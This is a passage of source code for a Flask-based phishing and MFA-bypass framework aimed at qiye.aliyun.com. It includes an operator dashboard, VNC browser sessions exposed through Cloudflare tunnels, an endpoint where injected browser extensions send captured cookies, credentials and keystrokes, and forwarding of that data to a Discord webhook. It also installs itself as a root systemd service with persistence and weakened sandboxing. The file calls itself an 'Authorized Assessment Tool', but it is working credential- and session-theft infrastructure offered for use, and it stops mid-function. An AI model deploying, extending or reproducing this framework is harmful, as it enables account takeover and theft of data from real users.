INDEX_HTML = """<!DOCTYPE html>
<html>
<head>
    <title>BitB MFA Bypass Framework v2.1</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0f0f23;color:#e0e0e0;padding:20px}
        h1{color:#00ff88;margin-bottom:5px}
        h1 small{font-size:14px;color:#888}
        .subtitle{color:#888;margin-bottom:20px}
        .card{background:#1a1a3e;border-radius:8px;padding:20px;margin-bottom:20px;border:1px solid #2a2a5e}
        .card h2{color:#00aaff;margin-bottom:15px}
        label{display:block;margin:10px 0 5px;color:#aaa}
        input,select{width:100%;padding:10px;background:#0f0f23;border:1px solid #333;color:#e0e0e0;border-radius:4px}
        button{background:#00aaff;color:#0f0f23;border:none;padding:10px 20px;border-radius:4px;cursor:pointer;font-weight:bold;margin-top:10px}
        button:hover{background:#00ccff}
        button.danger{background:#ff3355}
        button.success{background:#00ff88;color:#0f0f23}
        button.warning{background:#ffaa00;color:#0f0f23}
        .mono{font-family:'Courier New',monospace;font-size:13px}
        #results{white-space:pre-wrap;background:#0a0a1e;padding:15px;border-radius:4px;max-height:600px;overflow:auto;font-size:12px}
        .session-row{display:flex;justify-content:space-between;align-items:center;padding:10px;background:#0f0f23;margin:5px 0;border-radius:4px}
        .session-row:hover{background:#1a1a3e}
        .badge{padding:3px 8px;border-radius:10px;font-size:11px}
        .badge.active{background:#00ff88;color:#0f0f23}
        .badge.ext-injected{background:#aa44ff;color:#fff}
        .badge.exfild{background:#ffaa00;color:#0f0f23}
        .grid{display:grid;grid-template-columns:1fr 1fr;gap:20px}
        .grid-3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:20px}
        .tunnel-info{background:#0a2a1e;border:1px solid #00ff88;padding:10px;border-radius:4px;margin-bottom:10px}
        .tunnel-info a{color:#00ff88}
        .config-row{display:flex;justify-content:space-between;margin:5px 0;padding:5px 0;border-bottom:1px solid #2a2a5e}
        .ext-status{background:#1a0a3e;border:1px solid #aa44ff;padding:10px;border-radius:4px;margin-bottom:10px}
        .live-feed{max-height:200px;overflow-y:auto;background:#0a0a1e;padding:8px;border-radius:4px;font-size:11px;font-family:monospace;margin-top:10px}
        .feed-entry{padding:2px 0;border-bottom:1px solid #1a1a3e}
        .feed-entry .time{color:#666;margin-right:8px}
        .feed-entry .type{display:inline-block;padding:0 5px;border-radius:3px;font-size:10px;margin-right:5px}
        .type.cred{background:#00ff88;color:#000}
        .type.cookie{background:#ffaa00;color:#000}
        .type.keystroke{background:#aa44ff;color:#fff}
        .type.nav{background:#00aaff;color:#000}
        .stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:10px;margin:10px 0}
        .stat-box{background:#0f0f23;padding:12px;border-radius:6px;text-align:center}
        .stat-box .num{font-size:24px;font-weight:bold;color:#00ff88}
        .stat-box .label{font-size:11px;color:#888;margin-top:4px}
        .tab-bar{display:flex;gap:5px;margin-bottom:15px}
        .tab{cursor:pointer;padding:8px 16px;border-radius:4px 4px 0 0;background:#1a1a3e;border:1px solid #2a2a5e;border-bottom:none;color:#888}
        .tab.active{background:#0f0f23;color:#00ff88;border-color:#00ff88}
        .tab-content{display:none}
        .tab-content.active{display:block}
        .ip-list{max-height:300px;overflow-y:auto;background:#0a0a1e;padding:10px;border-radius:4px}
        .ip-item{display:flex;justify-content:space-between;padding:4px 8px;margin:2px 0;border-radius:3px;background:#1a1a3e}
        .ip-item:hover{background:#2a2a5e}
    </style>
</head>
<body>
    <h1>🔐 BitB MFA Bypass Framework <small>v2.1</small></h1>
    <p class="subtitle">Target: qiye.aliyun.com — Extension-Based Exfiltration | Authorized Assessment Tool</p>
    
    <div id="tunnelSection" class="tunnel-info" style="display:none">
        <strong>🌐 Tunnel Active:</strong> <a id="tunnelUrl" href="#" target="_blank"></a>
    </div>
    
    <div class="card" style="border-color:#0088ff">
        <h2>⚙️ System Status</h2>
        <div class="stats-grid">
            <div class="stat-box"><div class="num" id="cookieCount">0</div><div class="label">Cookies Captured</div></div>
            <div class="stat-box"><div class="num" id="credCount">0</div><div class="label">Credentials</div></div>
            <div class="stat-box"><div class="num" id="sessionCount">0</div><div class="label">Active Sessions</div></div>
            <div class="stat-box"><div class="num" id="extEventCount">0</div><div class="label">Extension Events</div></div>
        </div>
        <div class="live-feed" id="liveFeed">
            <div class="feed-entry"><span class="time">---</span> Waiting for data...</div>
        </div>
    </div>
    
    <div class="tab-bar">
        <div class="tab active" onclick="switchTab('sessions')">🎯 Sessions</div>
        <div class="tab" onclick="switchTab('access')">🛡️ Access Control</div>
        <div class="tab" onclick="switchTab('daemon')">⚙️ Daemon</div>
    </div>
    
    <div id="tab-sessions" class="tab-content active">
        <div class="grid">
            <div>
                <div class="card">
                    <h2>🎯 Create Session</h2>
                    <form id="createForm">
                        <label>User ID:</label>
                        <input type="text" id="userId" placeholder="target_01">
                        <label>Target URL:</label>
                        <input type="text" id="targetUrl" value="https://qiye.aliyun.com/">
                        <button type="submit">🚀 Launch (with Extensions)</button>
                    </form>
                </div>
                <div class="card">
                    <h2>📋 Log</h2>
                    <pre id="results">Awaiting actions...</pre>
                </div>
            </div>
            <div>
                <div class="card">
                    <h2>📡 Active Sessions</h2>
                    <div id="sessionList">Loading...</div>
                </div>
            </div>
        </div>
    </div>
    
    <div id="tab-access" class="tab-content">
        <div class="grid-3">
            <div class="card" style="border-color:#00ff88">
                <h2>✅ Whitelist</h2>
                <form id="whitelistForm">
                    <label>Add IP/CIDR:</label>
                    <input type="text" id="whitelistIp" placeholder="10.0.0.0/8">
                    <button type="submit" class="success">➕ Add to Whitelist</button>
                </form>
                <div class="ip-list" id="whitelistList">Loading...</div>
            </div>
            <div class="card" style="border-color:#ff3355">
                <h2>🚫 Blacklist</h2>
                <form id="blacklistForm">
                    <label>Add IP/CIDR:</label>
                    <input type="text" id="blacklistIp" placeholder="203.0.113.0/24">
                    <button type="submit" class="danger">🚫 Add to Blacklist</button>
                </form>
                <div class="ip-list" id="blacklistList">Loading...</div>
            </div>
            <div class="card" style="border-color:#ffaa00">
                <h2>🔒 Session Rules</h2>
                <form id="sessionAccessForm">
                    <label>Session ID:</label>
                    <input type="text" id="accessSessionId" placeholder="Session ID">
                    <label>Mode:</label>
                    <select id="accessMode">
                        <option value="whitelist">Whitelist (default deny)</option>
                        <option value="blacklist">Blacklist (default allow)</option>
                    </select>
                    <label>Allowed IPs (comma-separated):</label>
                    <input type="text" id="accessAllowed" placeholder="10.0.0.1,192.168.1.0/24">
                    <label>Denied IPs (comma-separated):</label>
                    <input type="text" id="accessDenied" placeholder="1.2.3.4">
                    <button type="submit" class="warning">🔒 Apply Rules</button>
                </form>
            </div>
        </div>
    </div>
    
    <div id="tab-daemon" class="tab-content">
        <div class="card">
            <h2>⚙️ Daemon Control</h2>
            <div id="daemonStatus">
                <div class="config-row"><span>Status:</span> <span id="dRunning" style="color:#00ff88">Checking...</span></div>
                <div class="config-row"><span>PID:</span> <span id="dPid">-</span></div>
                <div class="config-row"><span>Uptime:</span> <span id="dUptime">-</span></div>
                <div class="config-row"><span>Systemd:</span> <span id="dSystemd">-</span></div>
            </div>
            <div style="margin-top:15px;display:flex;gap:10px">
                <button onclick="restartDaemon()" class="danger" style="flex:1">🔄 Restart Service</button>
            </div>
        </div>
    </div>
    
    <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
    <script>
        const socket=io(),results=document.getElementById('results'),sessionList=document.getElementById('sessionList'),liveFeed=document.getElementById('liveFeed');
        let eventCount = 0;
        
        function log(m){const t=new Date().toISOString().slice(11,19);results.textContent=`[${t}] ${m}\\n`+results.textContent}
        
        function addFeedEntry(type, msg) {
            eventCount++;
            document.getElementById('extEventCount').textContent = eventCount;
            const d = new Date();
            const ts = d.toTimeString().slice(0,8);
            const div = document.createElement('div');
            div.className = 'feed-entry';
            div.innerHTML = '<span class="time">['+ts+']</span><span class="type '+type+'">'+type+'</span> '+msg;
            liveFeed.insertBefore(div, liveFeed.firstChild);
            if (liveFeed.children.length > 50) liveFeed.removeChild(liveFeed.lastChild);
        }
        
        function switchTab(name) {
            document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(t=>t.classList.remove('active'));
            document.querySelector(`.tab[onclick*="'${name}'"]`).classList.add('active');
            document.getElementById('tab-'+name).classList.add('active');
            if (name === 'access') refreshAccessLists();
            if (name === 'daemon') refreshDaemonStatus();
        }
        
        async function refreshAccessLists() {
            try {
                const r=await fetch('/api/access/status'),d=await r.json();
                document.getElementById('whitelistList').innerHTML = d.global_whitelist.length 
                    ? d.global_whitelist.map(ip=>'<div class="ip-item"><span>'+ip+'</span><button onclick="removeWhitelist(\\''+ip+'\\')" style="background:#ff3355;padding:2px 8px;font-size:11px;margin:0">✕</button></div>').join('')
                    : '<div class="ip-item" style="color:#666">No whitelist entries</div>';
                document.getElementById('blacklistList').innerHTML = d.global_blacklist.length
                    ? d.global_blacklist.map(ip=>'<div class="ip-item"><span>'+ip+'</span><button onclick="removeBlacklist(\\''+ip+'\\')" style="background:#ff3355;padding:2px 8px;font-size:11px;margin:0">✕</button></div>').join('')
                    : '<div class="ip-item" style="color:#666">No blacklist entries</div>';
            } catch(e) {}
        }
        
        async function removeWhitelist(ip) {
            await fetch('/api/access/whitelist/'+encodeURIComponent(ip),{method:'DELETE'});
            refreshAccessLists();
        }
        async function removeBlacklist(ip) {
            await fetch('/api/access/blacklist/'+encodeURIComponent(ip),{method:'DELETE'});
            refreshAccessLists();
        }
        
        async function refreshDaemonStatus() {
            try {
                const r=await fetch('/api/daemon/status'),d=await r.json();
                document.getElementById('dRunning').textContent = d.running ? '🟢 Running' : '🔴 Stopped';
                document.getElementById('dPid').textContent = d.pid || '-';
                document.getElementById('dUptime').textContent = d.uptime ? Math.floor(d.uptime/60)+'m '+Math.floor(d.uptime%60)+'s' : '-';
                document.getElementById('dSystemd').textContent = d.systemd ? '✅ Yes' : '❌ No';
            } catch(e) {}
        }
        
        async function restartDaemon() {
            if(confirm('Restart the BitB service? Sessions will be terminated.')) {
                await fetch('/api/daemon/restart',{method:'POST'});
                log('🔄 Service restart requested...');
            }
        }
        
        // Check tunnel
        async function checkTunnel(){try{const r=await fetch('/api/tunnel'),d=await r.json();if(d.url){document.getElementById('tunnelSection').style.display='block';document.getElementById('tunnelUrl').textContent=d.url;document.getElementById('tunnelUrl').href=d.url}}catch(e){}}
        checkTunnel();
        
        // Create session
        document.getElementById('createForm').onsubmit=async e=>{
            e.preventDefault();
            const uid=document.getElementById('userId').value||'target_'+Math.floor(Math.random()*10000);
            const tgt=document.getElementById('targetUrl').value;
            log('Creating session for '+uid+'...');
            addFeedEntry('nav','Creating session: '+uid);
            const r=await fetch('/api/session',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({user_id:uid,target_url:tgt})});
            const d=await r.json();
            if(d.status==='ok'){
                log('✅ Created! VNC: '+d.vnc_url+'\\nSession ID: '+d.session_id);
                if(d.tunnel_url) log('🌐 Tunnel: '+d.tunnel_url);
                addFeedEntry('nav','Session created: '+d.session_id.slice(0,16));
            } else log('❌ '+d.message);
            updateSessions();
        };
        
        // Whitelist form
        document.getElementById('whitelistForm').onsubmit=async e=>{
            e.preventDefault();
            const ip=document.getElementById('whitelistIp').value;
            await fetch('/api/access/whitelist',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip})});
            document.getElementById('whitelistIp').value='';
            refreshAccessLists();
            log('✅ Added '+ip+' to whitelist');
        };
        
        // Blacklist form
        document.getElementById('blacklistForm').onsubmit=async e=>{
            e.preventDefault();
            const ip=document.getElementById('blacklistIp').value;
            await fetch('/api/access/blacklist',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip})});
            document.getElementById('blacklistIp').value='';
            refreshAccessLists();
            log('🚫 Added '+ip+' to blacklist');
        };
        
        // Session access form
        document.getElementById('sessionAccessForm').onsubmit=async e=>{
            e.preventDefault();
            const sid=document.getElementById('accessSessionId').value;
            const mode=document.getElementById('accessMode').value;
            const allowed=document.getElementById('accessAllowed').value.split(',').map(s=>s.trim()).filter(Boolean);
            const denied=document.getElementById('accessDenied').value.split(',').map(s=>s.trim()).filter(Boolean);
            await fetch('/api/access/session/'+sid,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({whitelist:allowed,blacklist:denied,mode})});
            log('🔒 Session '+sid.slice(0,16)+' rules applied');
        };
        
        // Update sessions
        async function updateSessions(){
            const r=await fetch('/api/sessions'),d=await r.json();
            document.getElementById('sessionCount').textContent=d.count;
            if(!d.sessions.length){sessionList.innerHTML='<div class="session-row">No active sessions</div>';return}
            sessionList.innerHTML=d.sessions.map(s=>'<div class="session-row"><div><strong>'+s.user_id+'</strong><br><span class="mono">'+s.session_id.slice(0,16)+'...</span><br><small>Port '+s.vnc_port+'</small></div><div style="text-align:right"><span class="badge '+(s.extensions_injected?'ext-injected':'active')+'">'+(s.extensions_injected?'🧩 Extensions':'🟢 Active')+'</span><br><small>'+s.created_at.slice(11,19)+'</small></div></div>').join('');
        }
        
        socket.on('session_update',updateSessions);
        socket.on('ext_exfil_event',function(data){
            addFeedEntry(data.type,data.msg);
            if(data.type==='cred'){
                const c=parseInt(document.getElementById('credCount').textContent);
                document.getElementById('credCount').textContent=c+1;
            }
            if(data.type==='cookie'){
                const c=parseInt(document.getElementById('cookieCount').textContent);
                document.getElementById('cookieCount').textContent=c+1;
            }
        });
        
        setInterval(updateSessions,3000);
        updateSessions();
    </script>
</body>
</html>"""

# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 8: FLASK ROUTES (continued)
# ═══════════════════════════════════════════════════════════════════════════════

@app.route("/")
def index():
    return render_template_string(INDEX_HTML)


@app.route("/api/tunnel")
def api_tunnel():
    return jsonify({"url": tunnel_manager.get_api_url() if tunnel_manager else None,
                    "enabled": CONFIG["cloudflare_tunnel_enabled"]})


# ─── Session Routes ─────────────────────────────────────────────────────────

@app.route("/api/session", methods=["POST"])
def api_create_session():
    data = request.get_json()
    user_id = data.get("user_id", f"user_{uuid.uuid4().hex[:6]}")
    target_url = data.get("target_url")
    try:
        session = sm.create_session(user_id, target_url)
        socketio.emit("session_update", {})
        tunnel_url = None
        if CONFIG["cloudflare_tunnel_enabled"] and tunnel_manager:
            tunnel_url = tunnel_manager.start_vnc_tunnel(session["vnc_port"], session["session_id"])
            if tunnel_url:
                session["tunnel_url"] = tunnel_url
        return jsonify({
            "status": "ok",
            "session_id": session["session_id"],
            "vnc_url": session["vnc_url"],
            "vnc_port": session["vnc_port"],
            "tunnel_url": tunnel_url,
            "extensions_injected": session["extensions_injected"]
        })
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/api/sessions", methods=["GET"])
def api_list_sessions():
    with sm.lock:
        sessions = list(sm.sessions.values())
    return jsonify({
        "count": len(sessions),
        "sessions": [{
            "session_id": s["session_id"],
            "user_id": s["user_id"],
            "vnc_port": s["vnc_port"],
            "vnc_url": s["vnc_url"],
            "tunnel_url": s.get("tunnel_url"),
            "created_at": s["created_at"],
            "extensions_injected": s["extensions_injected"],
        } for s in sessions]
    })


@app.route("/api/session/<session_id>", methods=["GET"])
def api_get_session(session_id):
    session = sm.get_session(session_id)
    if not session:
        return jsonify({"error": "Not found"}), 404
    return jsonify(session)


@app.route("/api/session/<session_id>", methods=["DELETE"])
def api_destroy_session(session_id):
    sm.destroy_session(session_id)
    socketio.emit("session_update", {})
    return jsonify({"status": "destroyed"})


# ─── Extension Routes ───────────────────────────────────────────────────────

@app.route("/api/ext/status", methods=["GET"])
def api_ext_status():
    available = list(ext_manager.available_extensions.keys()) if ext_manager else []
    return jsonify({
        "extensions": available,
        "inject_enabled": CONFIG["inject_extensions"],
        "poll_interval": CONFIG["extension_poll_interval"],
        "count": len(available)
    })


@app.route("/api/ext/rebuild", methods=["POST"])
def api_ext_rebuild():
    if not ext_manager:
        return jsonify({"status": "error", "message": "Extension manager not available"}), 500
    try:
        built = ext_manager.build_all()
        return jsonify({
            "status": "ok",
            "built": list(built.keys()),
            "message": f"Built {len(built)} extensions: {', '.join(built.keys())}"
        })
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/api/ext/exfil", methods=["POST"])
def api_ext_exfil():
    """Endpoint for browser extensions to push exfiltrated data."""
    try:
        data = request.get_json()
        if not data:
            return jsonify({"status": "error", "message": "No data"}), 400
        
        ext_receiver.receive(data)
        
        # Emit to dashboard
        ext_type = data.get("type", "unknown")
        metadata = data.get("metadata", {})
        url = metadata.get("url", "unknown")[:50]
        socketio.emit("ext_exfil_event", {"type": ext_type, "msg": f"[{ext_type}] {url}"})
        
        return jsonify({"status": "ok"})
    except Exception as e:
        log.error(f"Extension exfil receive error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500


# ─── Access Control Routes ───────────────────────────────────────────────────

@app.route("/api/access/status", methods=["GET"])
def api_access_status():
    if ip_access_controller:
        return jsonify(ip_access_controller.get_status())
    return jsonify({"enabled": False, "error": "Access control not initialized"})


@app.route("/api/access/whitelist", methods=["POST"])
def api_access_whitelist_add():
    data = request.get_json()
    ip = data.get("ip", "")
    if not ip:
        return jsonify({"status": "error", "message": "IP address required"}), 400
    if ip_access_controller and ip_access_controller.add_to_whitelist(ip):
        return jsonify({"status": "ok", "message": f"Added {ip} to whitelist"})
    return jsonify({"status": "error", "message": f"Invalid IP: {ip}"}), 400


@app.route("/api/access/whitelist/<path:ip>", methods=["DELETE"])
def api_access_whitelist_remove(ip):
    if ip_access_controller and ip_access_controller.remove_from_whitelist(ip):
        return jsonify({"status": "ok", "message": f"Removed {ip} from whitelist"})
    return jsonify({"status": "error", "message": f"IP {ip} not found"}), 404


@app.route("/api/access/blacklist", methods=["POST"])
def api_access_blacklist_add():
    data = request.get_json()
    ip = data.get("ip", "")
    if not ip:
        return jsonify({"status": "error", "message": "IP address required"}), 400
    if ip_access_controller and ip_access_controller.add_to_blacklist(ip):
        return jsonify({"status": "ok", "message": f"Added {ip} to blacklist"})
    return jsonify({"status": "error", "message": f"Invalid IP: {ip}"}), 400


@app.route("/api/access/blacklist/<path:ip>", methods=["DELETE"])
def api_access_blacklist_remove(ip):
    if ip_access_controller and ip_access_controller.remove_from_blacklist(ip):
        return jsonify({"status": "ok", "message": f"Removed {ip} from blacklist"})
    return jsonify({"status": "error", "message": f"IP {ip} not found"}), 404


@app.route("/api/access/session/<session_id>", methods=["POST"])
def api_access_session_set(session_id):
    data = request.get_json()
    whitelist = data.get("whitelist", [])
    blacklist = data.get("blacklist", [])
    mode = data.get("mode", "whitelist")
    if ip_access_controller and ip_access_controller.set_session_access(session_id, whitelist, blacklist, mode):
        return jsonify({"status": "ok", "message": f"Session {session_id[:16]} access set to {mode}"})
    return jsonify({"status": "error"}), 400


@app.route("/api/access/session/<session_id>", methods=["DELETE"])
def api_access_session_remove(session_id):
    if ip_access_controller:
        ip_access_controller.remove_session_access(session_id)
    return jsonify({"status": "ok"})


@app.route("/api/access/session/<session_id>/check", methods=["POST"])
def api_access_session_check(session_id):
    data = request.get_json()
    client_ip = data.get("ip", request.remote_addr or "0.0.0.0")
    allowed = True
    if ip_access_controller:
        session = sm.get_session(session_id)
        port = session.get("vnc_port", 0) if session else 0
        allowed = ip_access_controller.check_session_access(session_id, client_ip, port)
    return jsonify({
        "session_id": session_id[:16],
        "client_ip": client_ip,
        "allowed": allowed,
        "action": "allow" if allowed else "deny"
    })


# ─── Daemon Routes ──────────────────────────────────────────────────────────

@app.route("/api/daemon/status", methods=["GET"])
def api_daemon_status():
    if daemon_manager:
        return jsonify(daemon_manager.get_status())
    return jsonify({"running": False, "message": "Daemon manager not initialized"})


@app.route("/api/daemon/restart", methods=["POST"])
def api_daemon_restart():
    if daemon_manager:
        daemon_manager.set_restart_flag()
        threading.Thread(target=daemon_manager.initiate_shutdown, daemon=True).start()
        return jsonify({"status": "ok", "message": "Restart scheduled"})
    return jsonify({"status": "error"}), 500


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 9: SHUTDOWN & RELOAD HANDLERS
# ═══════════════════════════════════════════════════════════════════════════════

def shutdown_handler():
    """Called during graceful shutdown."""
    log.info("🛑 Executing shutdown handler...")
    if 'tunnel_manager' in globals() and tunnel_manager:
        tunnel_manager.stop_all_tunnels()
    if ip_access_controller:
        ip_access_controller.cleanup()
    if 'sm' in globals() and sm:
        with sm.lock:
            session_ids = list(sm.sessions.keys())
        for sid in session_ids:
            try:
                sm.destroy_session(sid)
            except:
                pass
    log.info("✅ Shutdown handler complete")


def reload_config():
    """Reload configuration (called on SIGHUP)."""
    log.info("🔄 Reloading configuration...")
    config_path = os.environ.get("BITB_CONFIG", "/data/bitb/config.json")
    if os.path.exists(config_path):
        try:
            with open(config_path) as f:
                new_config = json.load(f)
            CONFIG.update(new_config)
            log.info("✅ Configuration reloaded")
        except Exception as e:
            log.error(f"Failed to reload config: {e}")
    if ip_access_controller:
        ip_access_controller._apply_all_rules()
    if daemon_manager:
        daemon_manager.systemd_reloading()


def dump_status():
    """Dump status information (called on SIGUSR1)."""
    log.info("📊 Status dump:")
    sessions_count = len(sm.sessions) if 'sm' in globals() and sm else 0
    log.info(f"  Active sessions: {sessions_count}")
    if ip_access_controller:
        status = ip_access_controller.get_status()
        log.info(f"  Access control: {'Enabled' if status['enabled'] else 'Disabled'}")
        log.info(f"  Whitelist entries: {len(status['global_whitelist'])}")
        log.info(f"  Blacklist entries: {len(status['global_blacklist'])}")
        log.info(f"  Session rules: {len(status['session_access'])}")
    if global_tunnel_url:
        log.info(f"  Public URL: {global_tunnel_url}")


def _watchdog_loop():
    """Periodic watchdog ping for systemd."""
    while True:
        time.sleep(15)
        if daemon_manager and not daemon_manager.is_shutdown_requested():
            daemon_manager.systemd_watchdog()


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 10: SYSTEMD SERVICE INSTALL
# ═══════════════════════════════════════════════════════════════════════════════

SYSTEMD_SERVICE_CONTENT = """[Unit]
Description=BitB MFA Bypass Framework v2.1
Documentation=https://github.com/bitb-framework
After=network.target docker.service
Wants=docker.service
Requires=docker.service

[Service]
Type=notify
ExecStartPre=/usr/bin/env bash -c 'while ! docker info >/dev/null 2>&1; do sleep 1; done'
ExecStart=/usr/local/bin/bitb --daemon
ExecReload=/bin/kill -HUP $MAINPID
ExecStop=/bin/kill -TERM $MAINPID
Restart=on-failure
RestartSec=10
TimeoutStartSec=120
TimeoutStopSec=30
User=root
Group=root
CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_RAW CAP_SYS_ADMIN
AmbientCapabilities=CAP_NET_ADMIN CAP_NET_RAW
NoNewPrivileges=false
ProtectSystem=full
ProtectHome=false
PrivateTmp=false
LimitNOFILE=65536
LimitNPROC=4096
KillMode=process
SendSIGKILL=no
WatchdogSec=30
NotifyAccess=all
Environment=BITB_HOME=/data/bitb
Environment=BITB_CONFIG=/data/bitb/config.json
Environment=PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

[Install]
WantedBy=multi-user.target
"""


def cmd_install_service():
    """Install the BitB systemd service."""
    svc_path = Path("/etc/systemd/system/bitb.service")
    svc_path.parent.mkdir(parents=True, exist_ok=True)
    svc_path.write_text(SYSTEMD_SERVICE_CONTENT)
    subprocess.run(["systemctl", "daemon-reload"], capture_output=True, timeout=10)
    
    # Create symlink
    script_path = Path(__file__).resolve()
    target = Path("/usr/local/bin/bitb")
    if not target.exists():
        try:
            target.symlink_to(script_path)
        except:
            pass
    
    print("✅ Systemd service installed at /etc/systemd/system/bitb.service")
    print("✅ Symlink: /usr/local/bin/bitb ->", script_path)
    print()
    print("Manage with:")
    print("  sudo systemctl enable bitb    # Auto-start on boot")
    print("  sudo systemctl start bitb     # Start now")
    print("  sudo systemctl status bitb    # Check status")
    print("  sudo journalctl -u bitb -f    # Follow logs")


def cmd_uninstall_service():
    """Remove the BitB systemd service."""
    subprocess.run(["systemctl", "stop", "bitb"], capture_output=True, timeout=10)
    subprocess.run(["systemctl", "disable", "bitb"], capture_output=True, timeout=10)
    Path("/etc/systemd/system/bitb.service").unlink(missing_ok=True)
    subprocess.run(["systemctl", "daemon-reload"], capture_output=True, timeout=10)
    Path("/usr/local/bin/bitb").unlink(missing_ok=True)
    print("✅ Systemd service uninstalled")


def cmd_status_service():
    """Show service status."""
    try:
        result = subprocess.run(["systemctl", "status", "bitb", "--no-pager"],
                                capture_output=True, text=True, timeout=10)
        print(result.stdout)
    except:
        pass
    pf = Path(CONFIG["pid_file"])
    if pf.exists():
        try:
            print(f"📝 PID file: {pf} (PID: {pf.read_text().strip()})")
        except:
            print(f"📝 PID file: {pf} (stale)")
    else:
        print("📝 PID file: Not running")


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 11: MAIN FUNCTION
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    global discord_exfil, ext_manager, ext_receiver, sm, tunnel_manager
    global ip_access_controller, daemon_manager, global_tunnel_url
    
    parser = argparse.ArgumentParser(
        description="BitB MFA Bypass Framework v2.1",
        epilog="Service commands: --install, --uninstall, --status, --enable, --disable, --daemon"
    )
    parser.add_argument("--install", action="store_true", help="Install systemd service")
    parser.add_argument("--uninstall", action="store_true", help="Remove systemd service")
    parser.add_argument("--status", action="store_true", help="Check service status")
    parser.add_argument("--enable", action="store_true", help="Enable auto-start on boot")
    parser.add_argument("--disable", action="store_true", help="Disable auto-start")
    parser.add_argument("--daemon", action="store_true", help="Run as daemon (for systemd)")
    parser.add_argument("--config", type=str, help="Path to config file (JSON)")
    parser.add_argument("--port", type=int, help="API server port")
    parser.add_argument("--target", type=str, help="Target URL")
    args = parser.parse_args()
    
    if args.install:
        cmd_install_service()
        return
    if args.uninstall:
        cmd_uninstall_service()
        return
    if args.enable:
        subprocess.run(["systemctl", "enable", "bitb"], timeout=10)
        print("✅ BitB service enabled on boot")
        return
    if args.disable:
        subprocess.run(["systemctl", "disable", "bitb"], timeout=10)
        print("✅ BitB service disabled from auto-start")
        return
    if args.status:
        cmd_status_service()
        return
    
    if args.config:
        try:
            with open(args.config) as f:
                CONFIG.update(json.load(f))
        except Exception as e:
            print(f"❌ Failed to load config: {e}")
            sys.exit(1)
    if args.port:
        CONFIG["listen_port_api"] = args.port
    if args.target:
        CONFIG["target_url"] = args.target
    if args.daemon:
        CONFIG["daemon_enabled"] = True
    
    # ─── Initialize Daemon ─────────────────────────────────────────────────
    daemon_manager = DaemonManager(shutdown_callback=shutdown_handler)
    daemon_manager.set_start_time()
    
    if daemon_manager.check_running():
        print("❌ BitB is already running. Use 'sudo systemctl restart bitb'")
        sys.exit(1)
    
    daemon_manager.write_pid_file()
    daemon_manager.setup_signal_handlers()
    daemon_manager.set_reload_callback(reload_config)
    daemon_manager.set_status_callback(dump_status)
    
    # ─── Create Directories ────────────────────────────────────────────────
    for d in [CONFIG["session_dir"], CONFIG["exfil_dir"],
              f"{CONFIG['exfil_dir']}/extensions/cookies",
              f"{CONFIG['exfil_dir']}/extensions/credentials",
              CONFIG["log_dir"], CONFIG["access_control_dir"]]:
        os.makedirs(d, exist_ok=True)
    
    # ─── Initialize Discord ───────────────────────────────────────────────
    discord_exfil = DiscordExfiltrator(CONFIG["discord_webhook_url"])
    
    # ─── Initialize Extension Manager ─────────────────────────────────────
    if HAS_EXT_MANAGER:
        try:
            ext_manager = ExtensionManager()
            if CONFIG["inject_extensions"]:
                log.info("🧩 Building browser extensions...")
                ext_manager.build_all()
        except Exception as e:
            log.warning(f"Extension manager init failed: {e}")
            ext_manager = None
    
    # ─── Initialize Receiver ──────────────────────────────────────────────
    ext_receiver = ExtensionExfilReceiver(discord=discord_exfil)
    
    # ─── Initialize Session Manager ───────────────────────────────────────
    sm = SessionManager(discord_exfiltrator=discord_exfil, ext_manager=ext_manager)
    
    # ─── Initialize Tunnels ───────────────────────────────────────────────
    tunnel_manager = CloudflareTunnelManager()
    
    # ─── Initialize Access Control ────────────────────────────────────────
    if CONFIG["access_control_enabled"]:
        log.info("🔒 Initializing IP access control...")
        ip_access_controller = IPAccessController(chain_prefix=CONFIG["access_control_chain"])
        if CONFIG["auto_whitelist_local"]:
            for cidr in ["127.0.0.0/8", "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"]:
                ip_access_controller.add_to_whitelist(cidr)
        ip_access_controller.initialize()
    
    # ─── Banner ────────────────────────────────────────────────────────────
    log.info("=" * 70)
    log.info("  BitB MFA Bypass Framework v2.1 — Enterprise Edition")
    log.info(f"  Target: {CONFIG['target_url']}")
    log.info(f"  Extensions: {'✅ ENABLED' if CONFIG['inject_extensions'] else '❌ DISABLED'}")
    log.info(f"  Access Control: {'✅ ENABLED' if CONFIG['access_control_enabled'] else '❌ DISABLED'}")
    log.info(f"  Daemon Mode: {'✅ ACTIVE' if CONFIG['daemon_enabled'] else '❌ Foreground'}")
    log.info(f"  Discord: {'✅ Configured' if CONFIG['discord_webhook_url'] != 'YOUR_DISCORD_WEBHOOK_URL_HERE' else '⚠️ NOT CONFIGURED'}")
    log.info(f"  Tunnels: {'Enabled' if CONFIG['cloudflare_tunnel_enabled'] else 'Disabled'}")
    log.info("=" * 70)
    
    # ─── Start API Server ─────────────────────────────────────────────────
    server = make_server(CONFIG["listen_host"], CONFIG["listen_port_api"], app, threaded=True)
    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()
    log.info(f"✅ API server listening on {CONFIG['listen_host']}:{CONFIG['listen_port_api']}")
    time.sleep(0.5)
    
    # ─── Start Tunnel ─────────────────────────────────────────────────────
    if CONFIG["cloudflare_tunnel_enabled"]:
